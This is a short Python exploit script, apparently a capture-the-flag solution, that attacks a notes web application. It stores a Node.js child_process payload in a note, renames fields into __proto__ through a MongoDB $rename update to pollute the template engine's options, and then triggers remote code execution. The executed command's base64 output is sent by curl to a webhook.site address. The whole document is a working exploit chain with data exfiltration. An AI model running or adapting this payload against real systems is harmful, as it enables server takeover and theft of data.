import requests
import json

WEBHOOK = "https://webhook.site/ccad15f1-22b1-4020-bc69-54fb3f617d66"
TARGET = "http://ctf-gemastik.ub.ac.id:10021"
COMMAND = "ls"

inject_payload = {
    "title": "1",
    "content": f"JSON.stringify; process.mainModule.require('child_process').exec('curl \\\"{WEBHOOK}/?q=`{COMMAND} | base64 -w 0`\\\"')"
}

edit_payload = {
    "$rename": {
        "title": "__proto__.client",
        "content": "__proto__.escapeFunction"
    }
}

print("Preparing injection...")
resp = requests.post(f"{TARGET}/notes", json = inject_payload)
resp_json = json.loads(resp.content.decode())
notes_id = resp_json["_id"]

requests.put(f"{TARGET}/notes/{notes_id}", json = edit_payload)

print("Triggering prototype pollution...")
requests.get(f"{TARGET}/stats")

print("Triggering RCE...")
requests.get(f"{TARGET}/RandomLink")

print("DONE!")